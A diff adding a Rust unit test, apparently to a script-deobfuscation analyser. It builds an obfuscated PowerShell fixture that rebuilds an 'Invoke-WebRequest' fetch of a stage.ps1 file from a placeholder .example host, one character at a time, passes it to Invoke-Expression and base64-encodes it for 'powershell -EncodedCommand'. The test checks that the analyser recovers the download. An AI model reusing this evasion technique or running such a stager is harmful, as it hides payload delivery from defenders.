@@ -16544,6 +16544,48 @@ Invoke-Expression $cmd"#,
     }
 
     #[test]
+    fn ps1_literal_tochararray_index_extractor_calls_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 'x{ch}' 1)"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-tochararray-index-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($value,$index) {{
+  return $value.ToCharArray()[$index]
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-tochararray-index-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal ToCharArray index extractor calls were not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_literal_string_case_extractor_call_recovers_nested_command() {
         use base64::Engine;
 
